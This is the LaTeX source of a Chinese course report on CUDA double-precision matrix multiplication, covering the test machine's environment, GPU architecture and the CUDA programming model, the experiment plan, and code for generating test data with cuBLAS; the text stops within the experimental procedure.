\documentclass[zihao=-4]{ctexart}
\usepackage[normalem]{ulem}
\useunder{\uline}{\ul}{}
%********************导言区宏包引入********************
\usepackage{xeCJK}
\usepackage{amssymb}
\usepackage{amsmath}
\usepackage{listings} %代码
\usepackage{graphicx}
\usepackage{multicol} %回车换段
\usepackage{xcolor}
\usepackage{geometry} %页面设置
\usepackage{fontspec}
\usepackage{setspace}
\usepackage{times}
\usepackage{fancyhdr} %页眉页脚
\pagestyle{fancy}
\usepackage{float} %表格位置
\usepackage{titlesec} %设置
\usepackage{titletoc}
\usepackage{gbt7714}    %控制参考文献格式为国标
\usepackage{multirow}
\usepackage{booktabs}   %表格相关
\usepackage{setspace}   %设置行距
\usepackage{caption} %caption
\usepackage{subcaption} %子图的caption
\usepackage{changepage} %左右缩进
\usepackage{array}
\usepackage{ragged2e}
\usepackage{xurl}
\newcolumntype{P}[1]{>{\RaggedRight\arraybackslash}p{#1}}
\def\UrlBreaks{%
    \do\/%
    \do\a\do\b\do\c\do\d\do\e\do\f\do\g\do\h\do\i\do\j\do\k\do\l%
    \do\m\do\n\do\o\do\p\do\q\do\r\do\s\do\t\do\u\do\v\do\w\do\x\do\y\do\z%
    \do\A\do\B\do\C\do\D\do\E\do\F\do\G\do\H\do\I\do\J\do\K\do\L%
    \do\M\do\N\do\O\do\P\do\Q\do\R\do\S\do\T\do\U\do\V\do\W\do\X\do\Y\do\Z%
    \do0\do1\do2\do3\do4\do5\do6\do7\do8\do9\do=\do/\do.\do:%
    \do\*\do\-\do\~\do\'\do\"\do\-}
\urlstyle{same}


% for 代码
\definecolor{mygreen}{rgb}{0,0.6,0}
\definecolor{mygray}{rgb}{0.5,0.5,0.5}
\definecolor{mymauve}{rgb}{0.58,0,0.82}


\graphicspath{ {include_picture/} }
\let\algorithm\relax
\let\endalgorithm\relax
\usepackage[ruled,vlined]{algorithm2e}%[ruled,vlined]{
\usepackage{algpseudocode}
\renewcommand{\algorithmicrequire}{\textbf{Input:}} 
\renewcommand{\algorithmicensure}{\textbf{Output:}}
%\renewcommand\thepage{\zihao{-5} ~\arabic{page}~}%页码字号

%定义两个arg
\DeclareMathOperator*{\argmax}{arg\,max}
\DeclareMathOperator*{\argmin}{arg\,min}
\DeclareCaptionLabelSeparator{mysep}{\space\space}  %自定义caption格式
\captionsetup[figure]{font={small}, labelfont=bf, labelsep=mysep, textfont=bf}   %图片caption格式
\captionsetup[table]{font={small}, labelfont=bf, labelsep=mysep, textfont={bf}}   %表格caption格式
\bibliographystyle{gbt7714-numerical} %修改了title斜体内容

\usepackage[colorlinks,bookmarksopen,bookmarksnumbered,citecolor=blue, urlcolor=blue]{hyperref}
\hypersetup{
    linkcolor=black
}

\setlength{\emergencystretch}{2em}

%********************导言区宏包引入********************
%********************第三方字体引入********************
%\setCJKmainfont[Path=fonts/,BoldFont=simhei.ttf,ItalicFont=simkai.ttf,SlantedFont=simfang.ttf]{simsun.ttc}
%中文字体涵盖黑体、宋体、楷体、仿宋
\setmainfont[Path=fonts/, 
BoldFont = times-new-roman-bold.ttf,
ItalicFont = times-new-roman-italic.ttf,
BoldItalicFont = times-new-roman-bold-italic.ttf
]{times-new-roman.ttf}
\setmonofont[Path=fonts/]{Courier New.ttf}
\setCJKfamilyfont{hwzs}[Path=fonts/]{STKzhongsong.ttf}%使用STZhogsong华文中宋字体
\newcommand{\zhongsong}{\CJKfamily{hwzs}}
\setCJKfamilyfont{hwxw}[Path=fonts/]{STKxinwei.ttf} % XSP 2023/3/3:
\newcommand{\xinwei}{\CJKfamily{hwxw}}              %  使用STZxinwei华文新魏字体.

%********************第三方字体引入********************


%********************中文字号设置********************
%\newcommand{\chuhao}{\fontsize{42pt}{\baselineskip}\selectfont}
\newcommand{\chuhao}{\fontsize{42pt}{0}}
\newcommand{\xiaochu}{\fontsize{36pt}{0}}
\newcommand{\yihao}{\fontsize{28pt}{0}}
\newcommand{\erhao}{\fontsize{21pt}{0}}
\newcommand{\xiaoer}{\fontsize{18pt}{0}}
\newcommand{\sanhao}{\fontsize{16pt}{0}}
\newcommand{\sihao}{\fontsize{14pt}{0}}
\newcommand{\xiaosi}{\fontsize{12pt}{0}}
\newcommand{\wuhao}{\fontsize{10.5pt}{0}}
\newcommand{\xiaowu}{\fontsize{9pt}{0}}
\newcommand{\liuhao}{\fontsize{8pt}{0}}
\newcommand{\qihao}{\fontsize{5.25pt}{0}}

% 个人信息 自定义命令 固定长度下划线
\newcommand\ful[2][4cm]{\underline{\makebox[#1][c]{#2}}}
%********************中文字号设置********************


%********************代码段********************
% https://www.cnblogs.com/PiaYie/p/15720770.html
\renewcommand{\lstlistingname}{代码}
\lstset{ %
  backgroundcolor=\color{white},   % choose the background color; you must add \usepackage{color} or \usepackage{xcolor}
  basicstyle=\footnotesize,        % the size of the fonts that are used for the code
  breakatwhitespace=false,         % sets if automatic breaks should only happen at whitespace
  breaklines=true,                 % sets automatic line breaking
  captionpos=bl,                    % sets the caption-position to bottom
  commentstyle=\color{mygreen},    % comment style
  deletekeywords={...},            % if you want to delete keywords from the given language
  escapeinside={\%*}{*)},          % if you want to add LaTeX within your code
  extendedchars=true,              % lets you use non-ASCII characters; for 8-bits encodings only, does not work with UTF-8
  frame=single,                    % adds a frame around the code
  keepspaces=true,                 % keeps spaces in text, useful for keeping indentation of code (possibly needs columns=flexible)
  keywordstyle=\color{blue},       % keyword style
  %language=Python,                 % the language of the code
  morekeywords={*,...},            % if you want to add more keywords to the set
  numbers=left,                    % where to put the line-numbers; possible values are (none, left, right)
  numbersep=5pt,                   % how far the line-numbers are from the code
  numberstyle=\tiny\color{mygray}, % the style that is used for the line-numbers
  rulecolor=\color{black},         % if not set, the frame-color may be changed on line-breaks within not-black text (e.g. comments (green here))
  showspaces=false,                % show spaces everywhere adding particular underscores; it overrides 'showstringspaces'
  showstringspaces=false,          % underline spaces within strings only
  showtabs=false,                  % show tabs within strings adding particular underscores
  stepnumber=1,                    % the step between two line-numbers. If it's 1, each line will be numbered
  stringstyle=\color{orange},     % string literal style
  tabsize=2,                       % sets default tabsize to 2 spaces
  literate={-}{{\textendash}}{1}
  %title="No name code"                   % show the filename of files included with \lstinputlisting; also try caption instead of title
}
%********************代码段********************


%********************页边距设置********************
\geometry{left=3cm,right=2cm,top=2.5cm,bottom=2.5cm}
\geometry{a4paper} % xsp 2023/3/7: 调整纸张大小为A4
%********************页边距设置********************

%********************段间距设置********************
\newcommand{\setParDis}{\setlength {\parskip} {0pt} }
%请在每部分使用这个
%********************段间距设置********************

%********************

\begin{document}
%********************页眉页脚设置********************
\lhead{}%设置左页眉为空
\rhead{}%设置左页眉为空
\setlength{\headwidth}{\textwidth}% 2023/3/3 XSP: 页眉长度适应文本
%********************页眉页脚设置********************


%********************标题格式设置********************

%\setcounter{secnumdepth}{0}%该命令取消了章标题前数字label

\CTEXsetup[name={,、},number={\chinese{section}}]{section}
\CTEXsetup[name={（,）},number={\chinese{subsection}}]{subsection}
\CTEXsetup[name={,.},number={\arabic{subsubsection}}]{subsubsection}% 不加会导致目录格式错误
% 设置subsubsection等格式
% \titleformat{\section}[block]{\sanhao\bfseries\centering}{\chinese{section}、}{0pt}{}[]
% \titleformat{\subsection}[block]{\sihao\bfseries}{（\chinese{subsection}）}{0pt}{}[]
% \titleformat{\subsubsection}[block]{\xiaosi\bfseries}{\arabic{subsubsection}、}{0pt}{}[]
\titleformat{\section}[block]{\sanhao\heiti\centering}{\chinese{section}、}{0pt}{}[]    % XSP 2023/3/3:
\titleformat{\subsection}[block]{\sihao\heiti}{（\chinese{subsection}）}{0pt}{}[]       %   将正文标题字体由加粗
\titleformat{\subsubsection}[block]{\xiaosi\heiti}{\arabic{subsubsection}.}{0pt}{}[]   % 修改为黑体。
\titlespacing{\section}{0pt}{25pt}{12pt}
\titlespacing{\subsection}{0pt}{7pt}{7pt}
\titlespacing{\subsubsection}{0pt}{5pt}{4pt}

\titlecontents{section}[1.6em]{\addvspace{2pt}\filright}
{\contentspush{\thecontentslabel\hspace{0.8em}}}
{}{\titlerule*[8pt]{.}\contentspage}

\titlecontents{subsection}[3.2em]{\addvspace{2pt}\filright}
{\contentspush{\thecontentslabel\hspace{0.8em}}}
{}{\titlerule*[8pt]{.}\contentspage}

\titlecontents{subsubsection}[6.4em]{\addvspace{2pt}\filright}
{\contentspush{\thecontentslabel\hspace{0.8em}}}
{}{\titlerule*[8pt]{.}\contentspage}
%********************标题格式设置********************

%\setcounter{section}{-3}  %标题计数器
%\stepcounter{section}

%*******************行间距段前段后*******************
\linespread{1.8}
%行间距为实际行间距乘以1.2,如此处实际为1.5倍行距
\setlength{\parskip}{0.5\baselineskip}
%*******************行间距段前段后*******************



%********************封面部分********************
%
%     论文题目：应准确、鲜明、简洁，能概括整个论文中最主要和最重要的内容。
% 题目不超过20个中文字，若语意未尽，可用副标题补充说明。副标题应处于从属
% 地位，一般可在题目的下一行用破折号“——”引出。论文题目应避免使用不常用缩
% 略词、首字母缩写字、字符、代号和公式等。
%
% \def\Fengru{第三十四届“冯如杯”竞赛主赛道}
\def\CourseName{《并行程序设计A》}
\leftline{\includegraphics[scale=1]{include_picture/xiaohui.png}} % XSP 2023/3/3: 取消校徽段首缩进
%格式控制部分
% \par \  
% \par \
% \par \
\vspace{32pt}
\begin{center}
\includegraphics[height=2.25cm, width=12.78cm, scale=1]{include_picture/xiaoming.png}
\end{center}
%格式控制部分
\vspace{12pt}

\begin{spacing}{3}
    % \erhao
    \begin{center}
      {
        \fontsize{22pt}{3}\selectfont
        \zhongsong{GPU矩阵相乘实验报告} %黑体这样调用，其余字体同理
      } 
        % \zhongsong{“冯如杯”竞赛主赛道项目是什么}
    \end{center}
    \rightline{\xinwei\sanhao{\CourseName 课程报告}} % XSP 2023/3/3: 副标题二号华文新魏居右

    \vspace{2cm}
    \begin{center}
    \textbf{\sanhao
        \makebox[2cm][s]{学院}：\ful[5cm]{软件学院}\\
        \makebox[2cm][s]{班级}：\ful[5cm]{ZY25211}\\
        \makebox[2cm][s]{姓名}：\ful[5cm]{刘益洲}\\
        \makebox[2cm][s]{学号}：\ful[5cm]{ZY2521110}\\
    }
    \end{center}

\end{spacing}
%格式控制部分
% \par \ 
% \par \
% \par \ 
% \par \
% \par \ 
% \par \
% \begin{center}
%     \sihao
%     \textbf{学院：计算机学院}
%     \par \ 
%     \textbf{本模板原作者：Someday}
% \end{center}

%格式控制部分
\par \ 
\begin{center}
\sanhao
\centerline{\heiti{}}%封面年月去掉
\end{center}

\pagenumbering{gobble} %封面无页码
%\thispagestyle{empty}


\renewcommand{\headrulewidth}{0pt}%没有页眉装饰线
\clearpage
\pagenumbering{roman} %摘要目录页小写罗马
 

%********************目录部分********************
\clearpage
\tableofcontents
\clearpage
%********************目录部分********************



\renewcommand{\headrulewidth}{0.4pt} %恢复页眉装饰线

%********************正文页眉部分********************
%\lhead{} 
\chead{\xiaowu \CourseName 课程报告} %设置居中页眉
%********************正文页眉部分********************

\pagenumbering{arabic} %正文页码从1开始，用阿拉伯数字
\setcounter{page}{1} 

\section{实验环境}
\setParDis %设置段间距为 0
\begin{spacing}{1.5}

本实验在表~\ref{tab:exp-env}所列硬件与表~\ref{tab:exp-sw}所列软件环境下完成；硬件信息由实验节点 \protect\texttt{dell-65} 通过 \protect\texttt{lscpu}、\protect\texttt{free} 与 \protect\texttt{nvidia-smi} 读取，软件信息通过 \protect\texttt{nvcc --version} 及 \protect\texttt{/usr/local/cuda/version.json} 等命令查询得到。矩阵乘法与性能测试均在单块 GPU（\protect\texttt{CUDA\_VISIBLE\_DEVICES=0}）上执行。

\begin{table}[H]
\small
\centering
\caption{实验节点硬件环境}
\label{tab:exp-env}
\begin{tabular}{P{3.2cm}P{9.2cm}}
\toprule
项目 & 规格或说明 \\
\midrule
主机名 & dell-65 \\
服务器型号 & Dell PowerEdge C4140 \\
处理器 & 2$\times$ Intel Xeon Gold 6148 @ 2.40GHz \\
逻辑处理器数量 & 80 \\
内存容量 & 约 252 GB（251 GiB） \\
图形处理器 & 4$\times$ NVIDIA Tesla V100-SXM2-32GB \\
计算能力 & 7.0 \\
\bottomrule
\end{tabular}
\end{table}

\begin{table}[H]
\small
\centering
\caption{实验节点软件环境}
\label{tab:exp-sw}
\begin{tabular}{P{3.5cm}P{9.2cm}}
\toprule
项目 & 规格或说明 \\
\midrule
操作系统 & Ubuntu 22.04.5 LTS（Jammy Jellyfish） \\
内核版本 & Linux 5.15.0-177-generic（x86\_64） \\
NVIDIA 驱动 & 580.159.03（\protect\texttt{nvidia-smi} 报告的 Driver Version） \\
驱动支持的 CUDA 版本 & 13.0（\protect\texttt{nvidia-smi} 顶部 CUDA Version 字段） \\
CUDA Toolkit & 12.6.3（安装路径 \protect\texttt{/usr/local/cuda}） \\
CUDA 编译器 & \protect\texttt{nvcc} 12.6.85（CUDA 12.6） \\
Nsight Compute & 版本 2024.3.2.3；路径 \protect\texttt{/opt/nvidia/nsight-compute/2024.3.2/ncu}；用于 \protect\texttt{make ncu-*} \\
Nsight Systems & 版本 2024.2.3.38；路径 \protect\texttt{/opt/nvidia/nsight-systems/2024.2.3/bin/nsys}；用于 \protect\texttt{make nsys-*} \\
主机 C/C++ 编译器 & GCC/G++ 11.4.0（Ubuntu 11.4.0-1ubuntu1\textasciitilde 22.04.3） \\
构建工具 & GNU Make 4.3 \\
\bottomrule
\end{tabular}
\end{table}


\section{NVIDIA GPU体系结构与CUDA编程模型}

在进入 GPU 矩阵相乘实验之前，我们首先需要对NVIDIA GPU体系结构以及CUDA编程模型建立基本的了解。

\subsection{NVIDIA GPU硬件结构}

NVIDIA GPU硬件包含以下几个主要结构：GPU处理集群（GPU Processing Clusters，GPC）、纹理处理集群（Texture Processing Clusters，TPC）、流式多处理器（Streaming Multiprocessors，SM）和CUDA核心（Streaming Processor，SP）。

\begin{figure}[H]
    \centering
    \includegraphics[width=0.95\textwidth]{plots/nvidia_cuda_ga100_overview.png}
    \caption{NVIDIA GA100核心全景图}
    \label{fig:nvidia-ga100-overview}
\end{figure}

图~\ref{fig:nvidia-ga100-overview}（NVIDIA，2020）展示了Ampere架构GPU核心GA100的结构。GPC是NVIDIA GPU架构中最高级别的结构单元，负责处理大量并行任务，实现高吞吐量的计算能力，其中包含若干TPC和其他一些共享资源，例如L2缓存。TPC是次一级的集群，主要负责处理纹理相关的计算任务。它包含若干SM，后者负责执行具体的CUDA线程块，其结构如图~\ref{fig:nvidia-ga100-sm}所示，包含四个SMSPs（SM sub partitions），是SM上的主要处理单元，管理一个固定大小的warp池。而SMSPs具有若干CUDA核心、调度器（scheduler）、寄存器堆、共享内存和其他辅助硬件。CUDA核心是最基本的计算单元，执行CUDA程序中的线程指令，分为不同类型，包括执行浮点运算的FP32和FP64核心、执行整数运算的INT32核心，以及进行深度学习加速运算的张量计算核心（Tensor Cores）。每个SM包含的CUDA核心数量通常较多，这使得GPU能够高效地执行并行计算任务。当计算一款GPU的CUDA核心总数时，通常统计其FP32核心的总数，因为FP32运算是GPU中最为常见的运算类型。

\begin{figure}[H]
    \centering
    \includegraphics[width=0.72\textwidth]{plots/nvidia_cuda_ga100_sm.png}
    \caption{GA100核心SM结构图}
    \label{fig:nvidia-ga100-sm}
\end{figure}

\subsection{CUDA编程模型}

本小节将对CUDA编程模型中的kernel核函数、线程层次结构、存储层次结构以及同步操作进行简要介绍。

在CUDA编程模型中，kernel核函数是在GPU设备上执行的并行计算单元，其核心设计思想是将计算任务分解为大量可同时执行的线程。与CPU上的顺序执行函数不同，kernel核函数在调用时需要指明线程组织方式，表明执行该核函数所需的线程数量和结构。每个线程独立执行核函数逻辑，通过线程索引访问输入数据或控制计算行为，从而实现数据并行或任务并行计算。

在计算能力9.0之前，CUDA的线程层次结构采用三级组织方式：最外层为线程网格（Grid），中间层为线程块（Block），最内层为线程（Thread），如图~\ref{fig:nvidia-cuda-thread-hierarchy}（a）（NVIDIA，2023）所示。Grid由Block组成，Block由Thread组成，其形状由\protect\texttt{dim3}类型的参数指定，支持一维、二维或三维布局，但其大小受具体GPU计算能力的限制。而在计算能力9.0中，NVIDIA在Block和Grid之间引入了一个新的层级线程块集群（Thread Block Cluster），如图~\ref{fig:nvidia-cuda-thread-hierarchy}（b）（NVIDIA，2023）所示。

\begin{figure}[H]
    \centering
    \begin{subfigure}{0.48\textwidth}
        \centering
        \includegraphics[width=\linewidth]{plots/nvidia_cuda_thread_hierarchy_ampere.png}
        \caption{Ampere架构线程层次结构图}
        \label{fig:nvidia-cuda-thread-hierarchy-ampere}
    \end{subfigure}
    \hspace*{\fill}
    \begin{subfigure}{0.48\textwidth}
        \centering
        \includegraphics[width=\linewidth]{plots/nvidia_cuda_thread_hierarchy_hopper.png}
        \caption{Hopper架构线程层次结构图}
        \label{fig:nvidia-cuda-thread-hierarchy-hopper}
    \end{subfigure}
    \caption{CUDA线程层次结构图}
    \label{fig:nvidia-cuda-thread-hierarchy}
\end{figure}

在执行时，Block Cluster中所有线程共同调度到一个GPC上，而Block中所有线程将会以32个为一组划分到不同warp，被调度到同一个SM中。warp是NVIDIA GPU调度的基本单位，其中所有线程以SIMD（单指令流多数据流）方式执行相同指令。

\begin{figure}[H]
    \centering
    \includegraphics[width=0.82\textwidth]{plots/nvidia_cuda_memory_hierarchy.png}
    \caption{CUDA存储层次结构图}
    \label{fig:nvidia-cuda-memory-hierarchy}
\end{figure}

存储层次结构是CUDA编程模型的另一核心要素，其设计旨在平衡访存速度与存储容量和可见范围，如图~\ref{fig:nvidia-cuda-memory-hierarchy}（NVIDIA，2025）所示。其中容量最大的为全局内存（Global Memory），能够被所有核函数访问，但其延迟较高。\protect\texttt{cudaMemcpy()}系列函数可以在主机和设备的全局内存间进行数据拷贝。同样被所有核函数共用的还包括纹理内存（Texture Memory）与常量内存（Constant Memory），这二者均为只读缓存型内存，前者针对二维数据寻址优化，支持硬件级数据插值；后者适用于核函数中频繁访问的常量数据，通过缓存机制减少全局内存访问次数。而共享内存（Shared Memory）则是隶属于线程块的高速存储单元，容量和访问延迟均显著小于全局内存，位于SM内部，其作用域限于当前线程块内的所有线程。寄存器（Register）是每个线程独占的最快存储单元，用于存储线程私有临时变量，寄存器的分配由编译器自动管理。此外，在计算能力9.0以上的架构中，在全局内存和共享内存之间，还有一层分布式共享内存（Distributed Shared Memory），比全局内存更快，作用域限于同一线程块集群中的线程。

最后，CUDA提供了多个同步函数，用于控制核函数的执行顺序和数据一致性。\protect\texttt{cudaDeviceSynchronize()}函数用于在主机代码中同步设备操作，确保之前启动的所有核函数在继续执行主机代码之前完成；而\protect\texttt{\_\_syncthreads()}则是一个内置的线程块级别的同步函数，在核函数中使用，用于在线程块内同步所有线程，每个线程在继续执行之前，都会等待所有线程都到达同步点。

此外，在CUDA程序设计和性能分析中，Stream和Context的概念也同样重要。

Stream是CUDA中用于管理异步操作的关键机制。它就像是一条任务流水线，在这个流水线里可以有序地安排各种CUDA操作，像核函数的调用、内存的拷贝等。每个Stream内的操作是按顺序依次异步执行的，不同Stream之间的操作可以并行开展。

Context可以看作是CUDA设备的一个独立运行环境。它包含了CUDA程序运行所需的各种状态信息，如内存分配情况、内核函数的编译状态等，每个Context都有自己独立的资源和状态。Context就像是一个容器，把不同的CUDA任务隔离开来。

Stream和Context，在某些方面类似于CPU程序设计概念中的线程和进程。







\subsection{编译工具与性能分析工具}

完成 CUDA 程序开发与实验测量，除硬件与编程模型外，还需熟悉从源码到可执行文件的编译流程，以及用于定位性能瓶颈的分析工具。本实验节点上的具体软件版本见表~\ref{tab:exp-sw}。

CUDA 源文件（\protect\texttt{.cu}）同时包含主机代码与设备代码（kernel）。编译时由 \protect\texttt{nvcc} 作为驱动，将二者分离：设备代码经 PTX 由 \protect\texttt{ptxas} 汇编为 cubin 并打包进 fatbinary；主机代码与设备封装一并交给系统 C/C++ 编译器与链接器，生成可执行文件。图~\ref{fig:cuda-compilation}（NVIDIA）概括了从 \protect\texttt{a.cu} 到 \protect\texttt{a.out} 的主要阶段。本实验通过 Makefile 调用 \protect\texttt{nvcc} 编译 \protect\texttt{bench}、\protect\texttt{verify\_gemm} 等目标；\protect\texttt{-O0}、\protect\texttt{-O3}、\protect\texttt{-Xptxas}、\protect\texttt{--fmad} 等选项分别作用于主机编译器、PTX 汇编器与乘加融合，从而影响 kernel 指令（详见实验过程中 O0 与 O3 对照实验）。

\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{plots/cuda-compilation-from-cu-to-executable.png}
    \caption{CUDA 源文件编译为可执行文件的主要流程}
    \label{fig:cuda-compilation}
\end{figure}

性能分析主要借助 Nsight Compute（\protect\texttt{ncu}）与 Nsight Systems（\protect\texttt{nsys}）。前者面向单个 kernel launch，采集占用率、访存吞吐量、指令统计等指标，本实验通过 \protect\texttt{make ncu} 生成 \protect\texttt{.ncu-rep} 报告；后者记录整次运行中 CUDA API、kernel 与数据传输的时间线，本实验通过 \protect\texttt{make nsys} 生成 \protect\texttt{.nsys-rep} 及 \protect\texttt{.sqlite} 统计文件。工具版本与安装路径见表~\ref{tab:exp-sw}；具体采集参数与 \protect\texttt{make} 目标见第~\ref{sec:exp-proc} 节。

\section{实验内容与方法}

本实验在实验节点裸机、单块 GPU（\protect\texttt{CUDA\_VISIBLE\_DEVICES=0}）上完成双精度方阵乘法的 CUDA 实现、正确性校验与性能分析。采用渐进式路线：先实现仅使用全局内存的朴素 kernel 并建立 baseline，再考察编译器优化与共享内存分块等改进；测试数据与 cuBLAS 标准结果预先落盘，保证各次实验输入一致、结果可复现。具体命令、代码与 profiling 配置见第~\ref{sec:exp-proc} 节。

\subsection{计算问题}

实验求解 $C=AB$，$A,B,C\in\mathbb{R}^{N\times N}$，矩阵按行主序以 \protect\texttt{double} 存储。本次作业实现的 kernel 与 cuBLAS 参考实现使用相同数据类型与布局，以便比对正确性与性能。

\subsection{总体流程}

实验按以下顺序组织（各环节细节在实验过程中展开）：

\begin{enumerate}
  \item 数据准备：为若干 $N$ 生成固定的随机 $A$、$B$ 并保存；调用 \protect\texttt{cublasDgemm} 离线计算 $C_{\mathrm{ref}}$ 作为标准结果。
  \item 朴素实现：编写全局内存 naive kernel，在关闭优化（\protect\texttt{-O0}）与默认优化（\protect\texttt{-O3}）两种编译配置下分别编译，对比编译器微优化对性能的影响。
  \item 正确性与性能：对每种实现校验 GPU 结果与 $C_{\mathrm{ref}}$ 的一致性；用 \protect\texttt{cudaEvent} 测量 kernel 执行时间，在多档 $N$ 上重复测试并统计 GFLOPS。
  \item 性能分析：使用 Nsight Compute（\protect\texttt{ncu}）与 Nsight Systems（\protect\texttt{nsys}）采集 kernel 内部指标与 CUDA 时间线，为后续优化提供依据。
  \item 共享内存分块：在朴素实现基础上将 $k$ 向分块数据载入块内共享内存并复用，采用 $32\times32$ 线程块；与 \protect\texttt{-O3} naive 及 cuBLAS 对比。
\end{enumerate}

测试规模取 $N=512,1024,2048,4096,8192$（见表~\ref{tab:matmul-sizes}）；benchmark 覆盖全部五档，profiling 侧重 $1024$--$8192$。cuBLAS 除生成 $C_{\mathrm{ref}}$ 外，亦作为工业级实现的性能参照上界。

\begin{table}[H]
\small
\centering
\caption{测试方阵规模}
\label{tab:matmul-sizes}
\begin{tabular}{cc}
\toprule
规模 $N$ & 用途 \\
\midrule
512  & 快速正确性验证 \\
1024--2048 & 中等规模 benchmark 与 profiling \\
4096--8192 & 大规模性能与访存行为 \\
\bottomrule
\end{tabular}
\end{table}

\subsection{对比维度}

表~\ref{tab:exp-compare} 归纳主要对比关系；定量结果见第~\ref{sec:exp-result} 节。

\begin{table}[H]
\small
\centering
\caption{实验对比维度}
\label{tab:exp-compare}
\begin{tabular}{lll}
\toprule
对比项 & 对象 & 目的 \\
\midrule
编译器优化 & \protect\texttt{-O0} vs.\ \protect\texttt{-O3} naive & 观察编译期微优化影响 \\
算法优化 & naive vs.\ 共享内存分块 & 量化访存优化收益 \\
性能上界 & 作业实现 vs.\ cuBLAS & 衡量与库函数差距 \\
规模扩展 & 不同 $N$ 下上述对比 & 观察规模效应 \\
\bottomrule
\end{tabular}
\end{table}


\section{实验过程}
\label{sec:exp-proc}

本章依次介绍测试数据准备、共用辅助代码，关闭与开启编译器优化下的朴素 GEMM 实验，以及基于共享内存分块的 GEMM 实现与实验步骤。

\subsection{测试数据生成}

本实验为各矩阵规模预先固定一组 $(A,B,C_{\mathrm{ref}})$ 并落盘保存，后续 benchmark 与校验直接读盘，无需每次重新生成随机矩阵或调用 cuBLAS。数据生成代码位于 \protect\texttt{final/data/}，主要文件见表~\ref{tab:data-files}。

\begin{table}[H]
\small
\centering
\caption{测试数据目录中的主要文件}
\label{tab:data-files}
\begin{tabular}{P{4.5cm}P{8.3cm}}
\toprule
路径 & 说明 \\
\midrule
\protect\texttt{data/mat\_data.h} & 输入/参考结果文件头结构与 magic 常量 \\
\protect\texttt{data/mat\_io.c}、\protect\texttt{data/mat\_io.h} & 读写 \protect\texttt{N\{N\}.bin} 与 \protect\texttt{N\{N\}\_cref.bin} \\
\protect\texttt{data/gen\_data.c} & 随机输入矩阵 $A$、$B$ 的生成程序 \\
\protect\texttt{data/gen\_cref.cu} & 调用 cuBLAS 计算 $C_{\mathrm{ref}}$ 并落盘 \\
\protect\texttt{data/Makefile} & 编译上述程序并批量生成数据 \\
\protect\texttt{data/N\{N\}.bin} & 输入文件（含 $A$、$B$） \\
\protect\texttt{data/N\{N\}\_cref.bin} & 标准结果文件（含 $C_{\mathrm{ref}}$） \\
\bottomrule
\end{tabular}
\end{table}

每个规模对应 \protect\texttt{N\{N\}.bin}：文件头 \protect\texttt{MatDataHeader}（\protect\texttt{magic=0x47454D4D}）后接行主序 \protect\texttt{double} 矩阵 $A$、$B$。随机数由 \protect\texttt{drand48()} 生成，基准种子 \protect\texttt{20260616}，对规模 $N$ 取种子 $\protect\texttt{20260616}+N$（$B$ 再加 1），保证可复现。文件头定义如下：

\begin{lstlisting}[caption={输入/参考结果文件头（\protect\texttt{mat\_data.h}）}]
#define MAT_DATA_MAGIC 0x47454D4Du /* "GEMM" */
#define MAT_DATA_VERSION 1u
#define MAT_DATA_DEFAULT_SEED 20260616u
#define MAT_CREF_MAGIC 0x47454D43u /* "GEMC" */

typedef struct MatDataHeader {
    uint32_t magic; uint32_t version; int32_t n; uint32_t seed;
} MatDataHeader;

typedef struct MatCRefHeader {
    uint32_t magic; uint32_t version; int32_t n;
} MatCRefHeader;
\end{lstlisting}

在 \protect\texttt{final/data/} 执行 \protect\texttt{make generate}，一次性生成 $N=512,1024,2048,4096,8192$ 的 \protect\texttt{N\{N\}.bin}（等价于 \protect\texttt{./gen\_data 512 1024 2048 4096 8192}）。表~\ref{tab:data-output} 汇总产出规模。

\begin{table}[H]
\small
\centering
\caption{已生成的测试数据文件}
\label{tab:data-output}
\begin{tabular}{rrr}
\toprule
文件 & 规模 $N$ & 约略大小 \\
\midrule
\protect\texttt{N512.bin}   & 512  & 4 MiB \\
\protect\texttt{N1024.bin}  & 1024 & 16 MiB \\
\protect\texttt{N2048.bin}  & 2048 & 64 MiB \\
\protect\texttt{N4096.bin}  & 4096 & 256 MiB \\
\protect\texttt{N8192.bin}  & 8192 & 1024 MiB \\
\bottomrule
\end{tabular}
\end{table}

输入就绪后，在同一目录执行 \protect\texttt{make gen-cref}，由 \protect\texttt{gen\_cref.cu} 在 GPU 上调用 \protect\texttt{cublasDgemm} 计算 $C_{\mathrm{ref}}=AB$ 并保存为 \protect\texttt{N\{N\}\_cref.bin}。cuBLAS 为列主序接口，程序利用 $(AB)^{\mathsf T}=B^{\mathsf T}A^{\mathsf T}$ 在转置标志下得到行主序意义下的 $C$；参考文件头 \protect\texttt{MatCRefHeader} 的 \protect\texttt{magic} 为 \protect\texttt{0x47454D43}（``GEMC''），随后为行主序 $C_{\mathrm{ref}}$。核心代码如下：

\begin{lstlisting}[caption={cuBLAS 计算参考结果（\protect\texttt{gen\_cref.cu} 节选）}]
CUBLAS_CHECK(cublasDgemm(handle, CUBLAS_OP_T, CUBLAS_OP_T,
                         n, n, n, &alpha, d_A, n, d_B, n,
                         &beta, d_C, n));
/* 列主序 GPU 结果转回行主序后写入 N{N}_cref.bin */
write_mat_cref(out_path, n, h_C);
\end{lstlisting}

\begin{table}[H]
\small
\centering
\caption{已生成的标准结果文件}
\label{tab:cref-output}
\begin{tabular}{rrr}
\toprule
文件 & 规模 $N$ & 约略大小 \\
\midrule
\protect\texttt{N512\_cref.bin}   & 512  & 2 MiB \\
\protect\texttt{N1024\_cref.bin}  & 1024 & 8 MiB \\
\protect\texttt{N2048\_cref.bin}  & 2048 & 32 MiB \\
\protect\texttt{N4096\_cref.bin}  & 4096 & 128 MiB \\
\protect\texttt{N8192\_cref.bin}  & 8192 & 512 MiB \\
\bottomrule
\end{tabular}
\end{table}

\subsection{辅助代码}

各 GEMM 实现目录（\protect\texttt{gemm\_naive\_O0/}、\protect\texttt{gemm\_naive/}、\protect\texttt{gemm\_shared/}）共用 \protect\texttt{final/util/} 下的辅助程序与构建规则，自身 Makefile 仅指定 kernel 源文件、编译选项及（必要时）线程块边长等参数。

\protect\texttt{gemm\_common.mk} 定义公共 \protect\texttt{make} 目标：\protect\texttt{all}（编译 \protect\texttt{bench}、\protect\texttt{verify\_gemm}）、\protect\texttt{check-all}、\protect\texttt{bench-run}、\protect\texttt{ncu[-N]}、\protect\texttt{nsys[-N]} 等；\protect\texttt{IMPL\_NAME} 取目录名，用于区分 CSV 与 profiling 输出前缀。默认编译选项为 \protect\texttt{-O3}，可在各目录 Makefile 中覆盖。

